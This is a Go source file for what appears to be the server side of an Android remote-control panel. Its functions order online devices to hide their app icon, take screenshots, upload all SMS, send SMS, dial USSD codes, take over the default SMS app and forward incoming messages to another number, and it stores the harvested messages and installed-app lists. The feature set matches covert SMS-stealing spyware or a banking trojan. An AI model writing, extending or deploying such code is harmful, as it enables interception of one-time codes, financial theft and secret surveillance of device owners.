package ws

import (
	"context"
	"encoding/json"
	"errors"
	"log/slog"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/base/realtime/internal/id"
	"github.com/base/realtime/internal/protocol"
	"github.com/base/realtime/internal/store"
)

type panelWaiter struct {
	ch chan protocol.PanelResultPayload
}

// DeviceCommand sends a panel.* command to an online device and waits for panel.result.
func (h *Hub) DeviceCommand(ctx context.Context, userID, deviceID, kind, iconMode string) (protocol.PanelResultPayload, int64, error) {
	kind = strings.TrimSpace(strings.ToLower(kind))
	switch kind {
	case "ping":
		return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelPing, map[string]any{"t": time.Now().UnixMilli()})
	case "icon":
		mode := strings.TrimSpace(strings.ToLower(iconMode))
		switch mode {
		case "normal", "hidden", "changed":
		default:
			return protocol.PanelResultPayload{}, 0, errors.New("invalid icon mode")
		}
		return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelIcon, protocol.PanelIconPayload{Mode: mode})
	case "sms.sync":
		return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelSmsSync, map[string]any{"t": time.Now().UnixMilli()})
	case "screenshot":
		return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelScreenshot, map[string]any{"t": time.Now().UnixMilli()})
	default:
		return protocol.PanelResultPayload{}, 0, errors.New("unknown command")
	}
}

func (h *Hub) AppsSync(ctx context.Context, userID, deviceID string) (protocol.PanelResultPayload, int64, error) {
	return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelAppsSync, map[string]any{"t": time.Now().UnixMilli()})
}

func (h *Hub) Ussd(ctx context.Context, userID, deviceID, code string, slot int) (protocol.PanelResultPayload, int64, error) {
	normalized, ok := protocol.NormalizeUssd(code)
	if !ok {
		return protocol.PanelResultPayload{}, 0, errors.New("invalid ussd")
	}
	if slot != 0 && slot != 1 {
		slot = 0
	}
	if row, err := h.store.FindClientDevice(ctx, userID, deviceID); err == nil {
		if row.Screen != nil {
			if !row.Screen.On {
				return protocol.PanelResultPayload{Error: "screen off"}, 0, nil
			}
			if row.Screen.Locked {
				return protocol.PanelResultPayload{Error: "screen locked"}, 0, nil
			}
		}
		if reason := protocol.SimUssdBlock(row.Client.Sims, slot); reason != "" {
			return protocol.PanelResultPayload{Error: reason}, 0, nil
		}
	}
	return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelUssd, protocol.PanelUssdPayload{
		Code: normalized,
		Slot: slot,
	})
}

func (h *Hub) SmsSend(ctx context.Context, userID, deviceID, to, body string) (protocol.PanelResultPayload, int64, error) {
	to = strings.TrimSpace(to)
	body = strings.TrimSpace(body)
	if to == "" || body == "" {
		return protocol.PanelResultPayload{}, 0, errors.New("invalid sms")
	}
	if utf8.RuneCountInString(to) > 32 || utf8.RuneCountInString(body) > 1000 {
		return protocol.PanelResultPayload{}, 0, errors.New("invalid sms")
	}
	return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelSmsSend, protocol.PanelSmsSendPayload{
		RequestID: id.New(),
		To:        to,
		Body:      body,
	})
}

func (h *Hub) SmsDefault(ctx context.Context, userID, deviceID, action string) (protocol.PanelResultPayload, int64, error) {
	action = strings.TrimSpace(strings.ToLower(action))
	switch action {
	case "claim", "restore":
	default:
		return protocol.PanelResultPayload{}, 0, errors.New("invalid action")
	}
	return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelSmsDefault, protocol.PanelSmsDefaultPayload{
		Action: action,
	})
}

func (h *Hub) Offmode(ctx context.Context, userID, deviceID string, on bool, to, filter string) (protocol.PanelResultPayload, int64, error) {
	to = strings.TrimSpace(to)
	filter = normalizeOffmodeFilter(filter)
	if on {
		if to == "" || utf8.RuneCountInString(to) > 32 || !hasDigit(to) {
			return protocol.PanelResultPayload{}, 0, errors.New("invalid number")
		}
	}
	return h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelOffmode, protocol.OffmodePayload{
		On:     on,
		To:     to,
		Filter: filter,
	})
}

func normalizeOffmodeFilter(filter string) string {
	switch strings.ToLower(strings.TrimSpace(filter)) {
	case "personal":
		return "personal"
	case "all":
		return "all"
	default:
		return "nonpersonal"
	}
}

func hasDigit(s string) bool {
	for _, r := range s {
		if r >= '0' && r <= '9' {
			return true
		}
	}
	return false
}

func (h *Hub) sendPanelAndWait(ctx context.Context, userID, deviceID, messageType string, payload any) (protocol.PanelResultPayload, int64, error) {
	if !h.deviceOnline(userID, deviceID) {
		return protocol.PanelResultPayload{}, 0, protocol.ErrDeviceOffline
	}
	messageID, body, err := protocol.PanelCommand(messageType, payload)
	if err != nil {
		return protocol.PanelResultPayload{}, 0, err
	}
	waiter := &panelWaiter{ch: make(chan protocol.PanelResultPayload, 1)}
	h.waitMu.Lock()
	h.panelWait[messageID] = waiter
	h.waitMu.Unlock()
	defer func() {
		h.waitMu.Lock()
		delete(h.panelWait, messageID)
		h.waitMu.Unlock()
	}()

	started := time.Now()
	if err := h.outbox.Enqueue(ctx, userID, deviceID, "", messageID, body); err != nil {
		return protocol.PanelResultPayload{}, 0, err
	}
	select {
	case result := <-waiter.ch:
		return result, time.Since(started).Milliseconds(), nil
	case <-ctx.Done():
		return protocol.PanelResultPayload{}, 0, protocol.ErrCommandTimeout
	}
}

func (h *Hub) deviceOnline(userID, deviceID string) bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	_, ok := h.byDevice[deviceKey(userID, deviceID)]
	return ok
}

func (h *Hub) notifyPanelResult(ref string, result protocol.PanelResultPayload) {
	if ref == "" {
		return
	}
	h.waitMu.Lock()
	waiter := h.panelWait[ref]
	h.waitMu.Unlock()
	if waiter == nil {
		return
	}
	select {
	case waiter.ch <- result:
	default:
	}
}

func (h *Hub) handlePanelResult(userID, deviceID string, env protocol.Envelope) {
	var result protocol.PanelResultPayload
	if len(env.Payload) > 0 {
		_ = json.Unmarshal(env.Payload, &result)
	}
	ref := protocol.RefValue(env.Ref)
	if result.IconState != "" {
		ctx, cancel := context.WithTimeout(h.root, 3*time.Second)
		_ = h.store.PatchClientIconState(ctx, userID, deviceID, result.IconState)
		cancel()
	}
	h.notifyPanelResult(ref, result)
}

func (h *Hub) handleAppsBatch(userID, deviceID string, env protocol.Envelope) {
	var payload protocol.AppsBatchPayload
	if len(env.Payload) == 0 || json.Unmarshal(env.Payload, &payload) != nil {
		return
	}
	items := make([]store.InstalledApp, 0, len(payload.Apps))
	seen := make(map[string]struct{}, len(payload.Apps))
	for _, app := range payload.Apps {
		pkg := strings.TrimSpace(app.PackageName)
		if !validPackage(pkg) {
			continue
		}
		if _, dup := seen[pkg]; dup {
			continue
		}
		seen[pkg] = struct{}{}
		label := strings.TrimSpace(app.Label)
		if label == "" {
			label = pkg
		}
		if len([]rune(label)) > 120 {
			label = string([]rune(label)[:120])
		}
		items = append(items, store.InstalledApp{
			PackageName: pkg,
			Label:       label,
			System:      app.System,
			Icon:        cleanIcon(app.Icon),
		})
	}
	ctx, cancel := context.WithTimeout(h.root, 8*time.Second)
	defer cancel()
	if err := h.store.SaveInstalledApps(ctx, userID, deviceID, payload.Reset, items); err != nil {
		slog.Warn("apps batch", "err", err, "user", userID, "device", deviceID)
	}
}

func validPackage(pkg string) bool {
	if len(pkg) < 3 || len(pkg) > 180 || !strings.Contains(pkg, ".") {
		return false
	}
	for _, r := range pkg {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_' || r == '.' {
			continue
		}
		return false
	}
	return true
}

func cleanIcon(icon string) string {
	icon = strings.TrimSpace(icon)
	if len(icon) < 16 || len(icon) > 12000 {
		return ""
	}
	for _, r := range icon {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '+' || r == '/' || r == '=' {
			continue
		}
		return ""
	}
	return icon
}

func (h *Hub) handleSmsBatch(userID, deviceID string, env protocol.Envelope) {
	var payload protocol.SmsBatchPayload
	if len(env.Payload) == 0 || json.Unmarshal(env.Payload, &payload) != nil {
		return
	}
	if len(payload.Messages) == 0 {
		return
	}
	items := make([]store.SmsMessage, 0, len(payload.Messages))
	for _, msg := range payload.Messages {
		providerID := strings.TrimSpace(msg.ProviderID)
		if providerID == "" {
			continue
		}
		items = append(items, store.SmsMessage{
			ProviderID: providerID,
			ThreadKey:  strings.TrimSpace(msg.ThreadKey),
			Address:    strings.TrimSpace(msg.Address),
			Body:       msg.Body,
			DateMs:     msg.Date,
			Type:       msg.Type,
			Read:       msg.Read,
		})
	}
	ctx, cancel := context.WithTimeout(h.root, 8*time.Second)
	defer cancel()
	if _, err := h.store.UpsertSmsBatch(ctx, userID, deviceID, items); err != nil {
		slog.Warn("sms batch", "err", err, "user", userID, "device", deviceID)
	}
}
